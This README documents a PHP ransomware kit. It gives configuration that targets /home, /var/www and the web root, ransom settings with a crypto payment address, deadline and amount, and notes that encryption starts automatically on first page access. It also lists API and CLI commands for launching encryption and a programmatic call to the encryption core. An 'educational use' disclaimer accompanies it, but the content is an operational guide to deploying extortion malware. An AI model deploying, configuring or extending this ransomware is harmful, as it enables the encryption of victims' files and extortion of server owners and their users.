# PHP Ransomware v2.0 - Advanced Encryption System

![PHP Version](https://img.shields.io/badge/PHP-7.4%2B-blue.svg)
![Architecture](https://img.shields.io/badge/Architecture-SOLID%2FMVC-green.svg)
![License](https://img.shields.io/badge/License-Educational%20Use-red.svg)

## 📖 Table of Contents

- [Overview](#overview)
- [Key Features](#key-features)
- [Architecture](#architecture)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [API Documentation](#api-documentation)
- [File Structure](#file-structure)
- [Security Considerations](#security-considerations)
- [Warning & Legal Notice](#warning--legal-notice)
- [Technical Specifications](#technical-specifications)
- [Troubleshooting](#troubleshooting)

## 🚀 Overview

PHP Ransomware v2.0 is a sophisticated, enterprise-grade encryption system built with modern PHP practices. This advanced implementation features a clean SOLID architecture, MVC pattern, and comprehensive configuration management for professional security testing and educational purposes.

## ✨ Key Features

### 🔒 Core Encryption
- **Military-Grade Crypto**: AES-256-CBC encryption with PBKDF2 key derivation
- **Dual Encryption**: Both file contents and filenames are encrypted
- **Batch Processing**: Efficient encryption/decryption of multiple files simultaneously
- **Smart Targeting**: Configurable directory scanning with exclusion patterns

### 🏗 Architecture
- **SOLID Principles**: Clean, maintainable, and extensible codebase
- **MVC Pattern**: Complete separation of concerns
- **Dependency Injection**: Loosely coupled components
- **Service Layer**: Dedicated business logic separation

### 🌐 User Interface
- **Modern Ransom Note**: Professional UI with countdown timer
- **Responsive Design**: Works on desktop and mobile devices
- **Interactive Elements**: Copy-to-clipboard, real-time countdown
- **Multi-Language Ready**: Easy localization support

### ⚙️ Configuration & Management
- **External Configuration**: YAML-style config files
- **Runtime Customization**: No code modification required
- **Logging System**: Comprehensive audit trails
- **Error Handling**: Graceful degradation and recovery

### 🔧 Advanced Features
- **Multi-Directory Support**: Encrypts across entire filesystem
- **API Endpoints**: RESTful API for automation
- **CLI Interface**: Command-line operation support
- **Modular Design**: Easy feature extensions

## 🏛 Architecture

### Design Patterns
```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│   Controllers   │ →  │     Services     │ →  │     Models      │
└─────────────────┘    └──────────────────┘    └─────────────────┘
         │                       │                       │
         ↓                       ↓                       ↓
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐
│      Views      │    │  Core Utilities  │    │  Data Access    │
└─────────────────┘    └──────────────────┘    └─────────────────┘
```

### Component Overview
- **Controllers**: Handle HTTP requests and responses
- **Models**: Business logic and data management
- **Services**: Specific encryption/decryption operations
- **Views**: Presentation layer with templates
- **Core**: Foundation utilities and helpers

## 📦 Installation

### Prerequisites
- PHP 7.4 or higher
- OpenSSL extension
- Multibyte String extension
- Composer (for dependency management)

### Quick Setup
```bash
# Clone or download the project
git clone <repository-url>
cd php-ransomware

# Install dependencies
composer install

# Create necessary directories
mkdir -p storage/{logs,keys,temp} build tests

# Initialize the application
php bootstrap.php
```

### Directory Permissions
```bash
# Set appropriate permissions
chmod 755 storage/
chmod 755 config/
chmod 644 config/*.php
```

## ⚙️ Configuration

### Main Configuration Files

#### `config/encryption.php`
```php
return [
    'crypto' => [
        'cipher' => 'AES-256-CBC',      // Encryption algorithm
        'key_length' => 32,             // Key size in bytes
        'iterations' => 10000,          // PBKDF2 iterations
        'algorithm' => 'SHA512',        // Hash algorithm
        'extension' => 'encrypted'      // Encrypted file extension
    ],
    
    'ransom' => [
        'note_template' => 'app/Views/ransom_note.php',
        'contact_email' => 'recovery@example.com',
        'payment_address' => '0xbc00e800f29524AD8b0968CEBEAD4cD5C5c1f105',
        'deadline_hours' => 72,
        'amount_eth' => 1.5
    ]
];
```

#### `config/paths.php`
```php
return [
    'base_directories' => [
        '/home',
        '/var/www',
        '/opt',
        '/usr/local',
        $_SERVER['DOCUMENT_ROOT']
    ],
    
    'excluded_paths' => [
        '/proc', '/sys', '/dev', '/run', '/boot'
    ],
    
    'excluded_extensions' => [
        'dll', 'exe', 'so', 'bin'
    ],
    
    'max_file_size' => 100 * 1024 * 1024  // 100MB limit
];
```

## 🎯 Usage

### Web Interface
1. **Access the application** through your web browser
2. **Automatic encryption** begins on first access
3. **Ransom note** displays with payment instructions
4. **Decryption form** available for key redemption

### Command Line Interface
```bash
# Basic encryption
php public/encrypt.php

# Verbose output
php public/encrypt.php --verbose

# Specific configuration
php public/encrypt.php --config=production
```

### Programmatic Usage
```php
<?php
require_once 'vendor/autoload.php';

use App\Models\RansomwareCore;

$core = new RansomwareCore();
$result = $core->executeEncryption();

if ($result['success']) {
    echo "Encrypted {$result['encrypted_files']} files";
}
```

## 🔌 API Documentation

### Endpoints

#### POST `/api/encrypt`
Starts the encryption process.

**Request:**
```json
{
  "force": false,
  "directories": ["/home", "/var/www"]
}
```

**Response:**
```json
{
  "success": true,
  "encrypted_files": 150,
  "total_files": 200,
  "directories": 5,
  "execution_time": "45.2s"
}
```

#### POST `/api/decrypt`
Decrypts files using provided key.

**Request:**
```json
{
  "key": "your_decryption_key_here"
}
```

**Response:**
```json
{
  "success": true,
  "decrypted_files": 150,
  "execution_time": "30.1s"
}
```

### API Client Example
```bash
# Using curl
curl -X POST http://localhost/api/encrypt \
  -H "Content-Type: application/json" \
  -d '{"force":true}'

curl -X POST http://localhost/api/decrypt \
  -H "Content-Type: application/json" \
  -d '{"key":"decryption_key"}'
```

## 📁 File Structure

```
php-ransomware/
├── app/                         # Application Core
│   ├── Controllers/             # Request handlers
│   │   ├── EncryptionController.php
│   │   ├── DecryptionController.php
│   │   └── RansomController.php
│   ├── Models/                  # Business logic
│   │   ├── FileSystem.php
│   │   ├── CryptoManager.php
│   │   ├── RansomwareCore.php
│   │   └── ConfigManager.php
│   ├── Services/                # Specific operations
│   │   ├── FileEncryptor.php
│   │   ├── FileDecryptor.php
│   │   ├── NameEncryptor.php
│   │   └── NameDecryptor.php
│   ├── Views/                   # Presentation layer
│   │   ├── ransom_note.php
│   │   ├── decryption_form.php
│   │   └── decryption_success.php
│   └── Core/                    # Foundation utilities
│       ├── Router.php
│       ├── Logger.php
│       └── Autoloader.php
├── config/                      # Configuration files
│   ├── app.php
│   ├── encryption.php
│   └── paths.php
├── public/                      # Web accessible
│   ├── index.php
│   ├── encrypt.php
│   ├── decrypt.php
│   └── assets/
├── storage/                     # Runtime data
│   ├── logs/                    # Application logs
│   ├── keys/                    # Encryption keys
│   └── temp/                    # Temporary files
├── tests/                       # Test suites
├── vendor/                      # Composer dependencies
├── build/                       # Build artifacts
├── composer.json                # Dependency management
├── bootstrap.php                # Application initializer
└── README.md                    # This file
```

## 🔐 Security Considerations

### Encryption Details
- **Algorithm**: AES-256-CBC
- **Key Derivation**: PBKDF2 with 10,000 iterations
- **Salt**: 16-byte cryptographically secure random
- **IV**: 16-byte cryptographically secure random
- **Key Storage**: Encrypted with separate key

### Security Features
- **Secure Random Generation**: Uses `random_bytes()` and `openssl_random_pseudo_bytes()`
- **Memory Management**: Sensitive data cleared after use
- **Error Handling**: No sensitive information in error messages
- **Input Validation**: Comprehensive input sanitization

### Best Practices
```php
// Secure key generation
$key = random_bytes(32);

// Proper encryption
$encrypted = openssl_encrypt(
    $data,
    'AES-256-CBC',
    $derivedKey,
    OPENSSL_RAW_DATA,
    $iv
);
```

## ⚠️ Warning & Legal Notice

### 🚨 IMPORTANT LEGAL DISCLAIMER

**THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY.**

### Permitted Uses
- ✅ Academic research and education
- ✅ Authorized penetration testing
- ✅ Security awareness training
- ✅ Defensive security development

### Strictly Prohibited Uses
- ❌ Unauthorized access to systems
- ❌ Encryption of data without explicit permission
- ❌ Extortion or ransom demands
- ❌ Any illegal activities

### Legal Responsibility
By using this software, you agree that:
- You have explicit permission to test target systems
- You understand and comply with all applicable laws
- You accept full responsibility for your actions
- The authors bear no liability for misuse

### Ethical Guidelines
1. **Always obtain written permission** before testing
2. **Use in isolated environments** whenever possible
3. **Respect privacy and data protection laws**
4. **Report vulnerabilities responsibly**
5. **Promote ethical security practices**

## 🔧 Technical Specifications

### System Requirements
| Component | Minimum | Recommended |
|-----------|---------|-------------|
| PHP Version | 7.4 | 8.0+ |
| Memory | 128MB | 512MB+ |
| Storage | 10MB | 100MB+ |
| OpenSSL | Required | Latest |

### Performance Metrics
- **Encryption Speed**: ~100 MB/s (varies by hardware)
- **File Processing**: 1,000+ files per minute
- **Memory Usage**: < 50MB typical
- **Concurrent Operations**: Limited by PHP configuration

### Supported File Systems
- Ext4, NTFS, FAT32, APFS
- Network shares (SMB, NFS)
- Cloud storage mounts

## 🐛 Troubleshooting

### Common Issues

#### Encryption Fails
```bash
# Check OpenSSL extension
php -m | grep openssl

# Verify file permissions
ls -la storage/

# Check PHP error log
tail -f /var/log/php/error.log
```

#### Performance Issues
```php
// Increase PHP memory limit
ini_set('memory_limit', '512M');

// Adjust execution time
set_time_limit(0);
```

#### Configuration Problems
```bash
# Validate config files
php -l config/encryption.php

# Check directory permissions
namei -l storage/logs/
```

### Debug Mode
Enable debug mode in `config/app.php`:
```php
'debug' => true,
'environment' => 'development'
```

### Log Files
Check application logs in `storage/logs/`:
```bash
tail -f storage/logs/ransomware-*.log
```

## 🤝 Contributing

While this is primarily an educational project, suggestions for improvement are welcome:

1. Focus on code quality and security
2. Maintain SOLID principles
3. Add comprehensive tests
4. Document all changes
5. Follow ethical guidelines

## 📄 License

This project is licensed for **Educational Use Only**. See the LICENSE file for complete terms and conditions.

---

**Remember**: With great power comes great responsibility. Use this tool wisely, ethically, and legally.